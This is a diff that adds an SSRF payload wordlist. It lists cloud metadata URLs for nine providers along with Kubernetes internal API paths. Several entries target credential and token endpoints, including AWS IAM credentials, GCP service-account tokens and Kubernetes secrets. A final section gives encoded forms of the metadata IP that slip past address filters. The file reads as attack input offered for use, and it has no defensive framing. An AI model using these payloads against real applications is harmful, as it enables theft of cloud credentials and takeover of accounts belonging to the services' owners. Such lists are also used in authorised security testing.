@@ -1,0 +1,139 @@
+# ============================================
+# AWS EC2 Metadata API
+# ============================================
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/local-hostname
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/meta-data/public-hostname
+http://169.254.169.254/latest/meta-data/public-ipv4
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/instance-type
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/security-groups
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/dynamic/instance-identity/signature
+http://169.254.169.254/latest/dynamic/instance-identity/pkcs7
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[MAC]/vpc-id
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[MAC]/subnet-id
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[MAC]/owner-id
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[MAC]/security-groups
+http://169.254.169.254/latest/meta-data/placement/availability-zone
+http://169.254.169.254/latest/meta-data/placement/region
+http://169.254.170.2/v2/credentials/  # AWS ECS Task Metadata
+
+# AWS IPv6
+http://[::ffff:169.254.169.254]
+http://[0:0:0:0:0:ffff:169.254.169.254]
+
+# ============================================
+# Google Cloud Metadata API
+# Requires: Metadata-Flavor: Google
+# ============================================
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/instance/machine-type
+http://metadata.google.internal/computeMetadata/v1/instance/zone
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+http://metadata.google.internal/computeMetadata/v1/instance/tags
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
+http://metadata.google.internal/computeMetadata/v1beta1/
+
+# ============================================
+# Microsoft Azure Metadata API
+# Requires: Metadata:true
+# ============================================
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/instance?api-version=2019-06-01
+http://169.254.169.254/metadata/instance/compute?api-version=2019-06-01
+http://169.254.169.254/metadata/instance/network?api-version=2019-06-01
+http://169.254.169.254/metadata/loadbalancer?api-version=2019-06-01
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01&format=text
+
+# ============================================
+# DigitalOcean Metadata API
+# ============================================
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
+
+# ============================================
+# Oracle Cloud Metadata API
+# ============================================
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/attributes/
+
+# ============================================
+# Alibaba Cloud Metadata API
+# ============================================
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# ============================================
+# Tencent Cloud Metadata API
+# ============================================
+http://metadata.tencentyun.com/
+http://metadata.tencentyun.com/latest/meta-data/
+
+# ============================================
+# Hetzner Cloud Metadata API
+# ============================================
+http://169.254.169.254/hetzner/v1/metadata
+http://169.254.169.254/hetzner/v1/metadata/hostname
+http://169.254.169.254/hetzner/v1/metadata/instance-id
+http://169.254.169.254/hetzner/v1/metadata/public-ipv4
+http://169.254.169.254/hetzner/v1/metadata/availability-zone
+http://169.254.169.254/hetzner/v1/metadata/region
+
+# ============================================
+# OpenStack / Rackspace Metadata API
+# ============================================
+http://169.254.169.254/openstack
+http://169.254.169.254/openstack/2012-08-10/meta_data.json
+http://169.254.169.254/openstack/2018-08-27/network_data.json
+
+# ============================================
+# Kubernetes Internal API
+# ============================================
+https://kubernetes.default.svc
+https://kubernetes.default.svc/api
+https://kubernetes.default.svc/api/v1/namespaces/default/secrets
+https://kubernetes.default.svc/api/v1/nodes
+https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
+https://kubernetes.default.svc/metrics
+
+# ============================================
+# SSRF Bypass Encodings for Metadata IP
+# ============================================
+http://2852039166
+http://0xA9FEA9FE
+http://0251.0376.0251.0376
+http://0251.254.169.254
+http://[::ffff:a9fe:a9fe]
+http://169.254.169.254.nip.io
+http://xip.io/169.254.169.254
+http://sslip.io/169.254.169.254
